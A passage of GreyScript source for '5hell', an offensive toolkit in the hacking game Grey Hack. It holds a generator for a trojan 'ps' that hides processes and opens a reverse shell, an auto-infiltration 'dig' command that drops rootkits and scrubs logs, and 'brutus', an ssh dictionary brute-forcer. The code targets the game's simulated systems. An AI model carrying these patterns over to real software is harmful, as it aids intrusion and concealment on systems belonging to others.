    ps = """"+"ps"+""""
    shell = """"+"5hell"+""""
    zp = """"+"0.0%"+""""
    z2 = """"+"0.3%"+""""
    z1 = """"+"0.4%"+""""
    zf = [zp,z1,z2]
    zf.shuffle
    m_path = """"+"/lib/metaxploit.so"+""""
    m = """"+"metaxploit.so"+""""
    //add = arg1
	if not pt then pt = "1222"
    if not add then add = """"+user_input("rshell addr:> ")+"""" else add = """"+add+""""
    if add == """"+""+"""" then return "aborting..."
    rip="ps=function();zp="+zp+";z2="+z2+";z1="+z1+";zf=[zp,z1,z2];zf.shuffle;procs = get_shell.host_computer.show_procs;k_tar = "+ps+";k_tar1 = "+shell+";processes = [];processes = procs.split(char(10));for p in processes;process = p.split(char(32));process_CMD = process[4];process_MEM = process[3];process_CPU = process[2];process_ID = process[1];process_user = process[0];if process_CMD == k_tar or process_CMD == k_tar1 then;continue;else;print(format_columns(process_user + char(32) + process_ID + char(32) + process_CPU + char(32) + process_MEM + char(32) + process_CMD));end if;end for;rng = range(1120, 9982);rng.shuffle;return(format_columns(active_user+char(32)+rng.pop+char(32)+"+zp+"+char(32)+zf.pop+char(32)+"+ps+"));end function"
    // nop
    nop="meta = include_lib("+m_path+");if not meta then include_lib("+m+");if not meta then exit(ps);meta.rshell_client("+add+","+pt+","+ps+");exit(ps)"
    header = char(10)+"// Cloak and Dagger"+char(10)
    cd = (header+char(10)+rip+char(10)+nop)
    localmachine.touch(currentPath, "ps.src")
    source = globals.get_file("ps.src")
    print("Cloak and Dagger Protocol v 0.4, by Plu70")
    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
    if source then
      source.set_content(cd)
      wait(1)
      out = source.get_content
      print(out)
      print
        print(colorLightBlue+"Saved to: "+colorWhite+currentPath+"/ps.src"+CT)
    else
      print("write failed"+char(10))
    end if
    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
    return 0
end function
command.dig = function(arg1,arg2=0,arg3=0,arg4=0)
  if not arg1 or arg1 == "help" or arg1 == "-h" then 
    if arg2 and arg2 == "extra" then return colorGold+"Dig: Extra!"+CT+char(10)+"Here is a useful dig.bat script for dropping rshells"+char(10)+"first, set dig.bat to:"+char(10)+
		"ifconfig -p | probe -q"+char(10)+
		"brutus | clipb"+char(10)+
		"clipa | echo PASSWORD:"+char(10)+
		"echo do 1 -f r.bat | clipc"+char(10)+
		"run /home/guest/rkit/5hell @b @c"+char(10)+
		"rclean -d 1"+char(10)+
		"quit dig_complete"+char(10)+char(10)+
		"then, poke a new file in rkit called r.bat"+char(10)+
		"set it to:"+char(10)+
		"rshell [your server ip] [some name]"+char(10)+
		"-- if you have set get_custom_object.HOME in 5hell.src then use this line instead:"+char(10)+
		"rshell @home [some name]"+char(10)+
		"quit rshell_placed"+char(10)+char(10)+
		"This will dig the target like normal, then launch 5hell with the gained root shell"+char(10)+"Once launched, a reverse shell will be dropped, the log scrubbed, rkit removed, and dig will exit both 5hell instances."
    return "<b>DIG v 2.1 Netcrawler || Autohacking || Automation</b>"+char(10)+
	"Usage: dig [-s|ip|port] [port|ip] [opt:--edit] -- auto-infiltrate a target"+char(10)+
	"-- runs <b>db</b> on target [ip] and [port]"+char(10)+
	"-- infiltrates via shell if found"+char(10)+
	"-- uploads rkit and runs 5hell on the target"+char(10)+
	"-- gains root and wipes the log"+char(10)+
	"-- performs other taskes as defined by the user in <u>dig.bat"+char(10)+
	"-- dig.bat may contain <b>do</b>calls (do # -f your.file) to daisy chain digs"+char(10)+
	"Note: dig may take port and ip in any order"+char(10)+
	"-- not supplying a port defaults to port 0 aka the rouer"+char(10)+
	"Usage: dig -s -- will scan the internet for a suitable target"+char(10)+
	"-- uses database.csv to choose targets with known kernel_router versions"+char(10)+
	"-- if the matched router has a shell exploit, dig will auto infiltrate as normal"+char(10)+
	"-- susses out random ips until a match is found"+char(10)+
	"-- sussing routers does not leave a log if no shell is found"+char(10)+
	"Note: edit /root/rkit/dig.bat to customize behavior"+char(10)+
	"-- by default you will be prompted to exit 5hell when dig completes"+char(10)+
	"-- type 'y' to exit and return to the script that launched dig"+char(10)+
	"-- or add <b>quit dig_complete</b> to exit automatically with an echo"+char(10)+
	"<b>Note:</b> supplying <b>--edit</b> as argument three will open dig.bat in scribus"+char(10)+
	"-- dig will continue as normal after editing is complete"+char(10)+
	"-- you may add/remove commands to be executed by dig here"+char(10)+
	"<b>Note:</b> supplying <b>--edit</b> as agrgument one will open dig.bat in scribus"+char(10)+
	"-- dig will then exit after editing the batch file."+char(10)+
	"Usage example:|> <b>rnip 1 | dig </b>"+char(10)+
    "Usage example:|> <b>dig 1.1.1.1 22 --edit"+char(10)+
	"Usage example:|> <b>do 20 | dig -s"
	colorGold+"Experimental</b></color>: dig -s -- sus mode, gets random routers and checks version against database"+char(10)+
	"-- if the lib version is in the database, will dig that router"+char(10)+
	"-- sussing specifically looks for shells on routers"+char(10)+
	"-- for best results, use a database.csv that only includes entries with shell exploits"+char(10)+
	"---- Extra: dig [-h|help] extra -- display extra help info"
  end if
  print(colorGold+"<u>------DIG-v-2.1------</u>"+CT+char(10))
  //tp = arg1.split(" ") // sometimes we want to pipe target ip AND a port. this will help with that.
  tp = arg1
  //t = tp[0] // target ip
  //p = tp[-1] // target port
  t = arg1 
  p = arg2
  suss = false
  if t == "-s" then 
  	suss = true
  	t = globals.sus // in 5phinx.5pk
	p = "0"
  end if
  //if p == t then p = arg2 /////////////// make sure this works: if arg1 was not split, arg 2 is the port. default is 0 aka router
  if not is_valid_ip(t) and t != "--edit" then
    t = arg2 
    p = arg1 
    if not is_valid_ip(t) and t != "--edit" then return "dig: invalid ip"
  end if
  if DEBUG then print "debug: target ip: "+t+char(10)+"debug: target port: "+p
  // find the root kit     
  kit = command.tree("/","rkit",1,"N")
  if not kit then return "rkit not found"
  pe = kit.permissions.values
  r = 0
  w = 0
  x = 0
  if pe[-1] == "x" then x = 1
  if pe[-2] == "w" then w = 1
  if pe[-3] == "r" then r = 1
  // edit dig.bat if necessary
  if DEBUG then print "debug: checking for dig.bat in: "+kit.path
  bat_file = globals.get_file(kit.path+"/dig.bat")
  if not bat_file then 
      command.poke(kit.path+"/dig.bat", "ifconfig -p | probe"+char(10)+"brutus | clipc"+char(10)+"grep -p 5hell | clipb"+char(10)+"run @b "" do 1 rshell @home "" @c"+char(10)+"rclean -d @c")
      bat_file = globals.get_file(kit.path+"/dig.bat")
      if not bat_file then return "dig: unable to find or create dig.bat, aborting."
  end if
  if arg1 == "--edit" or arg2 == "--edit" or arg3 == "--edit" or arg4 == "--edit" then 
	print("Editing the batch file: "+bat_file.path)
	command.scribus(bat_file)
  	if arg1 == "--edit" then return "dig: finished editing dig.bat"
	if p == "--edit" then p = "0"
  end if
  // verify that we're ready to go
  print("Checking dictionary...")
  if not BIGBRAIN then 
      tabs = globals.get_file("/root/tables/tp")
      if tabs then 
          command.cerebrum("-i",tabs.path)
      else 
          command.cerebrum
      end if
  end if
  // portmap target
  command.probe("-q",t,p)
  print "dig: clearing old XPLOITS list..."
  globals.XPLOITS = null
  // if not in database, scan target
//  if command.meta("link","-r") then
  print "dig: preparing to link database..."
  dcsv = globals.get_file(kit.path+"/database.csv")
  if not dcsv then
	print "dig: creating "+kit.path+"/database.csv.."
	print command.poke(kit.path+"/database.csv")
	dcsv = globals.get_file(kit.path+"/database.csv")
	if not dcsv then return colorOrange+"dig: database error"+char(10)+"-- manually create database.csv or run db"
  end if
//   if typeof(command.meta("link")) != "MetaLib" then
//       print command.db("-r")
//       //if command.meta("link","-r") then // idfk
// 	  if typeof(command.meta("link")) != "MetaLib" then // idfk // ffs this better work
//           return "dig: database error!"+char(10)+"-- idfk"
//       end if
//   end if
	ml = command.meta("link")
	if typeof(ml) != "MetaLib" then return "dig: unable to connect;"+char(10)+"-- firewall or bad ip:"+char(10)+"--: "+ml
	//ldb = command.linkdb(ml.name+" v "+ml.version)
	if globals.XPLOITS == null then print command.db("-r")
	if globals.XPLOITS == null then return "dig: database error!"+char(10)+"-- ffs, quid facis, Plutus?"+char(10)+"-- figere stercus"  // if shell exploit, exploit target
  mem = []
  unsec_val = []
  
  for xp in globals.XPLOITS
      yp = xp.split(" ")
      zp = yp[-1]
	  if DEBUG then print "debug: zp: "+zp
      if zp == "shell" then // needs adjustment to prioritize root > user > guest shells
          mem.push(yp[0])
          unsec_val.push(yp[1])
      end if
  end for
  if DEBUG then print "mem: "+mem
  if mem == [] then return "dig: shell exploit not found on target"
  digging = true
  dig_this = null
  while digging 
	if mem.len > 0 then
  		dig_this = command.zap(mem[0],unsec_val[0],0) // get the remote shell
		mem.pull 
		unsec_val.pull
		if typeof(dig_this) == "shell" then digging = false 
	else
		digging = false	
	end if
  end while
  if typeof(dig_this) != "shell" then 	
  	if suss then return command.dig("-s") else return "dig: failed to obtain shell on target."
  end if
  // upload rkit (mind permissions)
  if DEBUG then print "dig: found a shell"
  print command.perms("-r","o+rwx", kit.path)
  print kit.path+ " "+kit.permissions
  globals.shell.scp(kit.path, "/home/guest", dig_this)
  // command.perms("-r","o-rwx","/root/rkit")
  pe = ""
  if not r then pe = pe + "r"
  if not w then pe = pe + "w"
  if not x then pe = pe + "x"
  if pe != "" then print command.perms("-r","o-"+pe, kit.path)
  print "restoring permissions: "+kit.path+" "+kit.permissions
  // run 5hell on target with params:
  // -- cob import | brutus
  // -- other user defined params
  print "launching 5hell remotely..."
  globals.stack_pool("up")
  dig_this.launch("/home/guest/rkit/5hell", "do 1 -f /home/guest/rkit/dig.bat") // let's make this configurable instead of putting ppl on rails
  _cascade // exit if cascade
  globals.stack_pool("down")
  // rclean and exit
  // repeat if necessary
  return "returning to original 5hell session..."
end function
command.brutus = function(arg1, arg2=0, arg3=0, arg4=0, arg5=0)
	if arg1 == "-h" or arg1 == "help" then return colorGold+"Brutus || dictionary attack || brute force || ssh || passwords || hashes"+char(10)+char(10)+
		"Usage: brutus -- attempt to gain root pass and shell using onboard dict_a "+char(10)+
		"-- default onboard dict_a: ["+colorGold+globals.dict_a.len+CT+"] passwords"+char(10)+
		"-- on success sends <b>shell</b> to BUFFER and password to <b>clipa</b>"+char(10)+char(10)+
		"Usage: brutus -i [/path|object] -- import dictionary (may be csv or newline separated values)"+char(10)+
		"-- 5hell will attempt to determine the type. Please ensure valid inputs."+char(10)+
		"-- accepts: path to file or folder, or piped file/folder object"+char(10)+
		"-- See dfit for making a .csv from a newline separated dictionary file."+char(10)+
		"-- See cerebrum for altering onboard dict_a"+char(10)+char(10)+
		"NOTE: both of the above use <b>get_shell(u,p)</b> and therefore are for local use only"+char(10)+
		"-- ie: does not work through glasspool"+char(10)+char(10)+
		"Advanced: brutus -s [ip] [shell_object] -- use shell_object to initiate <b>ssh</b> + brutus attack against ip "+char(10)+
		"-- equal to <b>ssh root@-brutus [ip] 22 [ssh] </b>but uses the given shell instead of active shell"+char(10)+
		"-- this does NOT use get_shell and therefore is not limited to local use"
	if globals.GLASSPOOL > 0 then print colorGold+"brutus: warning: "+colorLightBlue+" GLASSPOOL</color> is active"+char(10)+"-- brutus does not translate through glasspool"+char(10)+"-- you <b>might</b> be rooting your own system"
	dic = globals.dict_a
	u_name = "root"
	ip = ""
	port = 22
	b_remote = false
	if arg1 == "-i" and arg1.len == 2 then
	 	if arg2 and arg2 != "0" then
			if typeof(arg2) == "string" then
				dic = globals.get_file(arg2)
			else
				if typeof(arg2) == "file" then
					dic = arg2
				else
					return "brutus: use: brutus -i [/path|file_object] -- import dictionary file"
				end if
			end if
		else
			return "brutus: use: brutus -i [/path|file_object] -- import dictionary file"
		end if
	end if
	if DEBUG then print("arg1: "+arg1+char(10)+"arg2: "+arg2+char(10)+dic)
	if not dic then return("Dictionary: "+arg2+" not found")
	print(colorGold+"Brutus: accessing dictionary..."+CT)
	if arg1 == "-s" and arg2 and typeof(arg2) == "shell" then
		print(colorLightBlue+"brutus: </b>Configuring remote attack...<b>"+CT)
		if arg3 and arg4 then
			if arg5 then port = arg5
			if typeof(port) != "number" then port = port.to_int
			if typeof(port) != "number" then return colorRed+"brutus: invalid port"+CT
			ip = arg4
			u_name = arg3
		else
			if arg3 then u_name = arg3
			ip = user_input("root@ip: ")
		end if
		if is_valid_ip(ip) then
			print("<b>brutus: remote attack configured.</b>")
			stop = user_input(colorRed+"WARNING:"+colorOrange+"Continuing will fill the terminal with ["+colorGold+globals.dict_a.len+colorOrange+"] connection attempts."+char(10)+" This cannot be avoided. Continue? [Y/n] "+CT)
			if stop == "n" or stop == "N" then return "aborting..."
			b_remote = true
		else
			return colorRed+"Brutus: invalid ip."+CT
		end if
	end if
	if typeof(dic) == "file" then
	 	if not dic.is_binary then
			d_buf = dic.get_content
			if d_buf.indexOf(",") > 0 then
				dic = d_buf.trim.split(",")
			else
				dic = d_buf.split(char(10))
			end if
		else
			if dic.is_folder then
				df = dic.get_folders
				box = []
				for f in df
					f_buf = f.get_content
					if f_buf.indexOf(",") > 0 then
						dic_buf = f_buf.trim.split(",")
					else
						dic_buf = f_buf.split(char(10))
					end if
					for d in dic_buf
						box.push(d)
					end for
					//wait(.1)
				end for
				dic = box[0:]
			else
				return "brutus: invalid dictionary input."+char(10)+"got: binary_file. expected: folder or ascii file."
			end if
		end if
	end if
	if typeof(dic) != "list" then return "brutus: dictionary error."
	if DEBUG then print("d_len: "+dic.len)
	for d in dic
		if b_remote then
			root = shell.connect_service(ip, port, u_name, d)
		else
			root = get_shell("root", d)
		end if
		if typeof(root) == "shell" then
			print("root:"+colorGold+""+d+""+CT)
			print("clipa: "+command.clipa(d))
			gotcha = root.host_computer.public_ip+":"+root.host_computer.local_ip
			print "brutus: "+colorGreen+"saving root password as index in custom object. \n-- access via <b>cob</b> command"
			if DEBUG then print("brutus: debug: calling cob: adding "+gotcha+" to index <b>"+d)
			print command.cob("set",d,gotcha)
			globals.BUFFER.push(root)
			print("<b>Shell sent to "+colorOrange+"BUFFER</color>."+char(10)+"-- access via Memory Alpha (<u>malp</u> command)</b>")
			return root
		end if
	end for
	print("...brute force attack failed.")
	return 0
end function
command.cerebrum = function(arg1, arg2, arg3=0, arg4=0)
	if arg1 == "-h" or arg1 == "help" then return colorGold+"<u>Magnum Cerebrum || Big Brain || dictionary || word list || rockme rocku"+char(10)+
	colorGold+"</b>Usage: cerebrum -- Expand dict_a to 300k+ passwords and store in custom_object.dictionary"+char(10)+
	"-- use <b>pwgen</b> instead to save passwords locally to file\n"+char(10)+
	"Usage:<b> cerebrum -i [/path/to/file|file_object|list] </b>-- import a custom dictionary"+char(10)+
	"-- file may be csv or nsv: ',' or char(10) "+char(10)+
	"-- may be file, directory, piped object, or list"+char(10)+
	"-- you may now import either tables/tp or tables/t5 with -i\n"+char(10)+
	"Usage: <b>cerebrum -i [ip|@home] </b>-- import dictionary file or folder from @home server"+char(10)+
	"-- searches for <b>tables/tp</b> on server at provided ip or @home ip"+char(10)+
	"-- see help @home for more information about the @home server"+char(10)+
	"-- @home will paste the @home ip any time it is used from the command line"+char(10)+
	"---- not just when using cerebrum"+char(10)+
	"-- if calling cerebrum -i internally with custom code:"+char(10)+
	"---- be sure to pass an actual ip address or the gco.HOME.ip index for that param\n"+char(10)+
	"Usage: cerebrum -p -- load only common player passwords (wip)\n"+char(10)+
	"Usage: <b>cerebrum --purge</b> -- purge the onboard dictionary (to save memory)\n"+char(10)+
	"Advanced: -- passing -d as any argument returns the onboard dictionary as a list"+char(10)+
	"---- importing a string of passwords directly is not supported, use brutus for that."+char(10)+
	"Note: cerebrum, without arguments, will autodetect tables/tp and offer to import it if present"+char(10)+
	"-- cerebrum will autoload tables/tp on launch"+char(10)

	if arg1 == "-i" and not arg2 then return "cerebrum: -i expects /path or file_object or @home."
	infile = null
	if arg1 == "--purge" then 
		globals.dict_a(["a"])
		globals.BIGBRAIN = false
		return "cerebrum: dictionary purged."
	end if
	if arg1 == "-i" then
		if not arg2 then return "crebrum: -i expects a path or file_object or list or @home" else print colorGold+"<size=75%>cerebrum: importing from: "+typeof(arg2)
		if typeof(arg2) == "list" then
			if arg2.len > 0 then 	
				globals.dict_a(arg2)
				globals.BIGBRAIN = true
				return "cerebrum: ["+colorGold+globals.dict_a.len+CT+"] passwords ready. " 
			else 
				return "cerebrum: import error. dictionary corrupted."
			end if
		end if
		if typeof(arg2) == "string" then
			if is_valid_ip(arg2) then
				r_ip = arg2
				r_p = get_custom_object.HOME.loginport
				r_pas = get_custom_object.HOME.pass
				if r_pass == "password" or r_pas == "" then 
					r_pas = user_input("@home server password (leave blank to abort)"+char(10)+":> ", 1) 
					if r_pas.trim == "" then return("aborting...")
					alt = user_input("Set "+r_pas+" as @home pass? [<b>Y</b>/n] ||: ",1,1).lower
					if alt != "n" then; get_custom_object.HOME.pass = r_pas;print "-- @home pass set";else;print "-- skipping";end if
				end if
				r_r = globals.shell.connect_service(r_ip, r_p, get_custom_object.HOME.user, r_pas)
				if typeof(r_r) == "shell" then
					infile = r_r.host_computer.File(get_custom_object.HOME.tp)
					if typeof(infile) != file then 
						infile = r_r.host_computer.File(get_custom_object.HOME.t5)
						if typeof(infile) != "file" then return colorWarning+"cerebrum: unable to locate tables/tp or tables/t5"+char(10)+"-- run <b>pwgen</b> on server or"+char(10)+"-- check gco.HOME.t5 or gco.HOME.tp"
					end if
				else
					return (colorRed+"cerebrum: remote server unreachable.")
				end if
			else
				infile = globals.get_file(arg2)
				if DEBUG then 
					if typeof(infile) == "file" then print "-- infile: "+infile.path else print "-- infile: "+infile
				end if
			end if
		else
			if typeof(arg2) == "file" then
				infile = arg2
			else
				return "cerebrum: invalid type; expects /path/file_or_folder or file_object or ip or @home"
			end if
		end if
		print(colorGold+"<size=75%>cerebrum: importing dictionary..."+char(10)+colorGold+"<align=center><size=75%><<>></align>")
		if infile and not infile.is_binary then
			d_b = infile.get_content.trim
			globals.dict_a([])
			if d_b.indexOf(",") > 0 then d_b = d_b.split(",") else d_b = d_b.split(char(10))
			d_l = []
			for line in d_b
				if line.indexOf("=") != null then d_l.push(line.trim.split("=")[1]) else d_l.push(line.trim)
			end for
			globals.dict_a(d_l)
		else
			if infile and infile.is_folder then
				globals.dict_a([])
				for dfile in infile.get_files
					if dfile.has_permission("r") and not dfile.is_binary then
						d_b = dfile.get_content.trim
						if DEBUG then print "d_b input size: "+d_b.len
						delim = ""
						if d_b.indexOf(",") != null then delim = "," else delim = char(10)
						if globals.dict_a.len < 710000 then 
							d_b = d_b.split(delim)
							dl = []
							for p in d_b 
								if p.indexOf("=") != null then dl.push(p.trim.split("=")[1]) else dl.push(p.trim)								
							end for 
							globals.dict_a(dl)	
							if DEBUG then print("dict_a: "+dict_a.len)
						else 
							print("cerebrum: max dictionary length reached. Could not load: "+dfile.path)
						end if
					end if
				end for
			else
				return "cerebrum: import error; no input file or folder"
			end if
		end if
		if dict_a.len > 0 then 
			globals.BIGBRAIN = true
			return "cerebrum: ["+colorGold+dict_a.len+CT+"] passwords ready. " 
		else 
			globals.BIGBRAIN = false
			return "cerebrum: import error. dictionary corrupted"
		end if
	end if
	if globals.BIGBRAIN == true then return "Magnum Cerebrum already active."+char(10)+"Run the command: <b>cerebrum --purge</b> to reset."
	print(colorGold+"<align=center> Magnum Cerebrum </align>"+CT)
	print(colorGold+"- - - - - - - - - - - - - - - - - - - - - - - - - -"+CT)
	//globals.BIGBRAIN = true
	time_s = time
	if DEBUG then print("DEBUG: TIME: "+time_s)
	//tab = get_shell.host_computer.File("/root/tables/tp")
	tab = command.tree("/","tables","1","N")
	if DEBUG then print "debug: tab is a: "+typeof(tab)
	if tab then 
		autoimport = user_input("Detected "+tab.path+"; Auto-import passwords?"+char(10)+"[<b>Y</b>/n] (q=quit) ||: ",0,1)
	// if typeof(tab) == "file " and tab.has_permission("r") and tab.is_folder then 
	// 	if DEBUG then print "-- seeking t5/tp"
	// 	tf = tab.get_folders
	// 	tp = null
	// 	for t in tf
	// 		if t.name == "t5" then tp = t 
	// 		if t.name == "tp" then tp = t // tp takes priority
	// 	end for
	// 	if typeof(tp) == "file" then 
	// 		print("Detected "+tp.path+"; Auto-import passwords?")
	// 		autoimport = user_input("[<b>Y</b>/n] (q=quit)||: ",0,1)
		if autoimport.lower == "q" then return
		if autoimport.lower != "n" then
			return globals._import_tables 
			//print("Calling "+colorWhite+"<u>cerebrum -i "+tp.path)
			//print command.cerebrum("-i", tp.path)
			//return globals.dict_a.len+" passwords imported in "+str(time-time_s)+" seconds"
		end if
		print "cerebrum: ignoring "+tab.path+"..."
	else 
		print "cerebrum: cannot find tp or t5"
	end if
	//end if
	print colorGold+"</b>cerebrum: working..."
	if DEBUG then print("cerebrum calling: pwgen false "+arg1)
	command.pwgen("false",arg1)
	time_e = (time - time_s)
	print( globals.dict_a.len+" passwords readied in "+time_e+" seconds" )
	if arg1 == "-d" or arg2 == "-d" or arg3 == "-d" then return dict_a else return 0
end function
if DEBUG then print("<size=75%>loading jtr.5pk...(3.397kb)</size>")
command.jtr = function(arg1,arg2,arg3,arg4=0)
	if arg1 == "help" or arg1 == "-h" or not arg3 then return "John The Ripper password generator"+char(10)+"Usage: jtr [set_size] [word_length(1-15)] [opt:aAns] [opt:1]" + char(10) + "a - lowercase alpha" +char(10)+ "A - uppercase alpha"+char(10)+"n - numbers"+char(10)+"s - special characters"+char(10)+"note: at least ONE option must be selected"+char(10)+"1 -- optional only first letter is upper case (any value here is considered 1/true), leave blank for false."
	if arg1.to_int <= 0 then return "size error: greater than zero expected"
	if arg2.to_int <= 0 or arg2.to_int > 15 then return "length error: expected between 1 and 15"

	array = []
	alpha_l = range("a".code,"z".code)
	i = 0
	for c in alpha_l
		alpha_l[i] = char(c)
		i = i + 1
	end for
	alpha_u = range("A".code,"Z".code)
	i = 0
	for c in alpha_u
		alpha_u[i] = char(c)
		i = i + 1
	end for
	numbers = []
	nums = range(0,9)
	for n in nums 
		numbers.push(str(n))
	end for
	special = ["!","@","#","$","%","^","&","*","(",")","-","+","=","}","{","[","]",";",":","<",">",",",".","'",""""]

	SET_SIZE = arg1.to_int // generate 1000 words 
	SET_RANGE = arg2.to_int // string of length 15
	PARAMS = [0,0,0,0] // use alpha_l, use alpha_u, use numbers, use special
	if arg3.indexOf("a") >= 0 then PARAMS[0] = 1
	if arg3.indexOf("A") >= 0 then PARAMS[1] = 1
	if arg3.indexOf("n") >= 0 then PARAMS[2] = 1
	if arg3.indexOf("s") >= 0 then PARAMS[3] = 1
	if PARAMS.indexOf(1) == null then return "option error: must select a, A, n, and/or s"

	first_cap = 0
	if arg4 then first_cap = 1
	//print("arg4 is "+arg4+" and first_cap is "+ first_cap)
	output = []
	dupe_count = 0
	time_out_limit = "1000000"

	line = []
	if PARAMS[0] then line = line + alpha_l
	if PARAMS[1] then line = line + alpha_u
	if PARAMS[2] then line = line + numbers
	if PARAMS[3] then line = line + special
	//print(line)
	if typeof(line) != "list" then return "PARAMS error"
	
	print("<b>Generating wordlist...</b>")
	loops = SET_SIZE
	s1 = 10
	s5 = 50
	s7 = 75
	while loops
		i = 0
		array = range( 0 , SET_RANGE - 1 )
		while i < SET_RANGE
			line.shuffle
			if first_cap == true then 
				if i == 0 then  
					array[i] = line[0].upper
				else
					array[i] = line[0].lower
				end if
			else 
				array[i] = line[0]
			end if
			i = i + 1
			//wait(.01)
		end while
		if output.indexOf(array.join("")) == null then // ouput
			output.push(array.join(""))
			//loops = loops - 1
		else 
			array.shuffle
			if output.indexOf(array.join("")) == null then 
				output.push(array.join(""))
			else 
				dupe_count = dupe_count + 1
				if dupe_count == time_out_limit.to_int then 
					print "jtr: timeout limit reached: too many duplicates"+char(10)+"-- we managed to make: "+output.len+" passwords"
					return output.join(char(10))
				end if
			end if
		end if
		loops = loops - 1
		if DEBUG then print colorOrange+"output length: "+output.len
		if SET_SIZE / loops == 10 then 
			print(colorGold+"loading..."+(s1)+"% complete")
			s1 = s1 + 1 
		end if
		if SET_SIZE / loops == 4 then 
			print(colorGold+"loading... "+(s7)+"% complete")
			s7 = s7 + 1
		end if
		if SET_SIZE / loops == 2 then 
			print(colorGold+"loading... "+(s5)+"% complete")
			s5 = s5 + 5
		end if
		//wait(.01)
	end while
	return output.join(char(10)) // max string size is 1 million chars
end function
command.string = function(arg1,arg2,arg3,arg4)
	if arg1 == null or arg1 == "help" or arg1 == "-h" then return "String | To String | List | Join | replace"+char(10)+
	colorGreen+"String and List functions (more to be added over time)."+char(10)+
	"-- I didn't want to make a string command AND a list command so both are here."+char(10)+
	colorWhite+"Lists: Stringifying lists:"+char(10)+
	colorCyan+"Usage: string [opt] [list] -- converts a list to a string and returns it"+char(10)+
	"-- use the clipboards and @a|@b|@c or piping to supply the list"+char(10)+
	colorCyan+"Usage: string [lista] [listb] -- will return lista concatenated with listb"+char(10)+
	"-- returns a <b>LIST</b>"+char(10)+
	"-- pipe the resulting list back into string to stringify"+char(10)+
	"-- e.g.: <b>string @a @b | string -n | poke new.txt</b>"+char(10)+
	"-- I justify this as 'stringing two lists together' "+char(10)+char(10)+
	"Option: -n -- join list with <color=red>char(10)"+char(10)+
	"Option: -c -- join list with <color=blue>commas"+char(10)+
	"Option: -C -- join list with <color=green>colons"+char(10)+
	"Option: -s -- join list with <color=yellow>semicolons"+char(10)+
	"Option: -S -- join list with <color=white>spaces"+char(10)+
	"Note: the default join delimiter is char(10)"+char(10)+
	"-- i.e: <b>string [list]</b> is the same as <b>string [-n] [list]"+char(10)+char(10)+
	colorWhite+"Strings: Stringify strings:"+char(10)+
	colorCyan+"Usage: string [-t] [target_text] -- returns trimmed text"+char(10)+
	"-- ie: it removes whitespace"+char(10)+
	colorCyan+"Usage: string [-p] [target_text] -- strip the noparse richtext tag from a string and return it"+char(10)+
	colorCyan+"Usage: string [-N] [target_text] -- return string with the noparse tag prepended to each line"+char(10)+
	colorCyan+"Usage: string [-r] [target_text] [replacement_text] [string_to_parse]"+char(10)+
	"-- replace all instances of target_text with replacement_text within string_to_parse"+char(10)+
	"-- use piping, easy clip, and "" text blocks "" to supply strings"+char(10)+
	"-- use @0 alone in order to indicate a zero space character; aka remove"+char(10)+
	"-- use @32 in order to indicate a space (char(32))"+char(10)+
	"-- use @10 to indicate a newline (char(10))"+char(10)+
	"-- use @[int] to specify any other character code"+char(10)+
	"-- uses miniscript regex, you must escape <b>.</b> with <b>\.</b>"+char(10)+
	"-- uses miniscript regex; you can ignore the above and use regex instead"+char(10)+
	"-- all params should be strings and the function returns the modified string"+char(10)+
	//colorCyan+"Usage: string [-R] -- as above but allows the use of miniscript supported regex"+char(10)+
	colorCyan+"Usage: string [-R] [text_to_remove] [string_to_parse] -- returns string with text removed"+char(10)+
	"-- uses regex, you must escape <b>.</b> with <b>\.</b>"+char(10)+
	colorWhite+"Numbers: Stringify numbers"+char(10)+
	colorCyan+"Usage: string [number] -- returns str(number) as a string"+char(10)+
	"-- please note that numbers are passed as numbers, not strings, when piped"+char(10)+
	colorWhite+"Numberify strings:"+char(10)+
	colorCyan+"Usage: string [-i] [string] -- converts a string to an integer and returns an integer"+char(10)+
	"--eg:<b> string -i 100"+char(10)+
	colorCyan+"Usage: string [-v] [string] -- converts a string to a floating point value and returns it"+char(10)+
	"--eg:<b> string -v 3.12159"+char(10)+
	colorWhite+"Listify strings"+char(10)+
	colorCyan+"Usage: string [-l] [delim] [string] -- turn a string split at [delim] into a list"+char(10)+
	"-- use floating quotes or piping to supply complex input strings"+char(10)+
	"--eg:<b> string -l , one,two,three"+char(10)+
	"--eg:<b> string -l , "" one, two, three, four "" "+char(10)+
	colorCyan+"Usage: string [-L] [delim] [string] -- as above but applys .to_int to each element"+char(10)+
	"-- ie: returns a list of integers"+char(10)+
	"--eg:<b> string -L , 1,2,3,4"+char(10)+
	"Note: maps are not yet supported"

	_handle_replacement = function( target, replacement, in_string )
		if DEBUG then print "debug: t: "+target+" r: "+replacement+" is: "+in_string
		if not in_string isa string or not target isa string or not replacement isa string then return "replace: -r expects strings"
		if replacement.values[0] == "@" then 
			rvs = replacement.split("@")[1].to_int
			if typeof(rvs) == "number" then 
				if rvs > 0 then replacement = char(rvs) else replacement = ""
			end if
		end if
		if target.values[0] == "@" then 
			tvs = target.split("@")[1].to_int
			if typeof(tvs) == "number" then 
				if tvs > 0 then target = char(tvs) else target = ""
			end if
		end if
		//if use_regex == true then return in_string.replace_regex( target, replacement )
		out_string = in_string.replace( target, replacement )	// miniscript .replace uses miniscript regex
		return out_string
	end function
	_to_int = function( in_string )
		if typeof(in_string) != "string" then return "string: expected string, got "+typeof(in_string)
		return in_string.to_int
	end function 
	_to_val = function( in_string )
		if typeof(in_string) != "string" then return "string: expected string, got "+typeof(in_string)
		return in_string.val 
	end function
	_to_list = function( delim, in_string )
		if not delim or typeof(delim) != "string" then return "string: delimiter must be a string"
		if not in_string or typeof(in_string) != "string" then return "string: input string not supplied"
		return in_string.split(delim)
	end function
	_to_int_list = function( delim, in_string )
		if not delim or typeof(delim) != "string" then return "string: delimiter must be a string"
		if not in_string or typeof(in_string) != "string" then return "string: input string not supplied"
		s_a = in_string.split(delim)
		s_b = []
		for s in s_a 
			s_b.push(s.to_int)
		end for
		return s_b
	end function
	_trim_input = function( instring )
		if typeof( instring ) != "string" then return "string: expects [-t] [string_input]"
		sp_str = instring.split(char(10))
		output = []
		for line in sp_str 
			output.push(line.trim)
		end for
		return output.join(char(10)).trim
	end function
	_no_parse_input = function( instring )
		if typeof( instring ) != "string" then return "string: expects [-N] [string_input]"
		sp_str = instring.split(char(10))
		output = []
		for line in sp_str 
			output.push("<noparse>"+line)
		end for
		return output.join(char(10)).trim
	end function
	_strip_input = function( instring )
		if typeof( instring ) != "string" then return "string: expects [-p] [string_input]"
		sp_str = instring.split(char(10))
		output = []
		for line in sp_str 
			output.push(line.replace("<noparse>",""))
		end for
